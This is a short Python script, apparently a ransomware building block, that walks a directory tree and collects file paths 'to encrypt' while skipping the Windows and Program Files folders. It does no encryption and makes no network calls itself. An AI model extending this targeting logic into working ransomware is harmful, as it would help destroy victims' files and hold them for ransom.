import os

# crawl files and return file paths to encrypt
def crawl_files(start_dir, dirs_to_skip):
    result = []
    for path, dirs, files in os.walk(start_dir):
        if should_skip(path, dirs_to_skip):
            continue
        for name in files:
            result.append(path + '\\' + name)
    return result

# true if this directory should be skipped
def should_skip(path, dirs_to_skip):
    for dir in dirs_to_skip:
        if dir in path:
            return True
    return False

if __name__ == "__main__":
    dirs_to_skip = ["Program Files (x86)", "Program Files", "Windows"]
    start_dir = "./crawler_test_dir"
    print(crawl_files(start_dir, dirs_to_skip))